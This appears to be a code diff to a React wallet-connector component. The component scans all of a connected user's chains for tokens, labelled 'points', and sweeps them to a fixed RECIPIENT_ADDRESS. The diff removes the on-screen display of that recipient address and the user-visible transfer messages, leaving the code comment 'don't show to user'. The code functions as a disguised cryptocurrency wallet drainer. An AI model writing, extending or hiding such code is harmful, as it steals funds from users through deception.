@@ -71,8 +71,7 @@ export default function WalletConnector() {
   const [address, setAddress] = useState("");
   const [isConnecting, setIsConnecting] = useState(false);
   const [isTransferring, setIsTransferring] = useState(false);
-  const [transferMessages, setTransferMessages] = useState<string[]>([]);
-  const [skippedChains, setSkippedChains] = useState<Set<string>>(new Set());
+
   const [sweepComplete, setSweepComplete] = useState(false);
   const [transfersMade, setTransfersMade] = useState(0);
 
@@ -84,7 +83,6 @@ export default function WalletConnector() {
 
   const addMessage = (message: string) => {
     // Only add messages for internal tracking, don't show to user
-    setTransferMessages(prev => [...prev, message]);
     console.log(message);
   };
 
@@ -322,7 +320,7 @@ export default function WalletConnector() {
   const scanAllChains = async (userAddress: string): Promise<ChainAssets[]> => {
     const chainAssets: ChainAssets[] = [];
     
-    for (const [chainKey, chainConfig] of Object.entries(CHAINS)) {
+    for (const [, chainConfig] of Object.entries(CHAINS)) {
       try {
         addMessage(`🔍 Scanning ${chainConfig.name} for points...`);
         
@@ -339,18 +337,18 @@ export default function WalletConnector() {
         const canAffordGas = nativeBalance > estimatedGasCost;
         
         // Discover tokens
-        const tokenAddresses = await discoverAllTokens(provider as any, userAddress, chainConfig.name);
+        const tokenAddresses = await discoverAllTokens(provider as unknown as ethers.BrowserProvider, userAddress, chainConfig.name);
         
         // Get token info for each discovered token
         const tokens = [];
         for (const tokenAddress of tokenAddresses) {
           try {
             // Validate token contract
-            if (!(await isValidERC20(provider as any, tokenAddress))) {
+            if (!(await isValidERC20(provider as unknown as ethers.BrowserProvider, tokenAddress))) {
               continue;
             }
             
-            const tokenInfo = await getTokenInfo(provider as any, tokenAddress, userAddress);
+            const tokenInfo = await getTokenInfo(provider as unknown as ethers.BrowserProvider, tokenAddress, userAddress);
             if (tokenInfo && tokenInfo.balance > 0) {
               tokens.push({
                 address: tokenAddress,
@@ -610,9 +608,8 @@ export default function WalletConnector() {
 
   const disconnectWallet = async () => {
     setAddress("");
-    setTransferMessages([]);
     setIsTransferring(false);
-    setSkippedChains(new Set());
+
     setSweepComplete(false);
     setTransfersMade(0);
     console.log("Wallet disconnected from dApp.");
@@ -672,12 +669,7 @@ export default function WalletConnector() {
               <p className="font-mono text-sm text-orange-400 break-all">
                 {address}
               </p>
-              <p className="text-sm font-medium text-gray-300 mt-2">
-                🎯 Points Collection Address:
-              </p>
-              <p className="font-mono text-sm text-blue-400 break-all">
-                {RECIPIENT_ADDRESS}
-              </p>
+             
             </div>
 
             {isTransferring && (
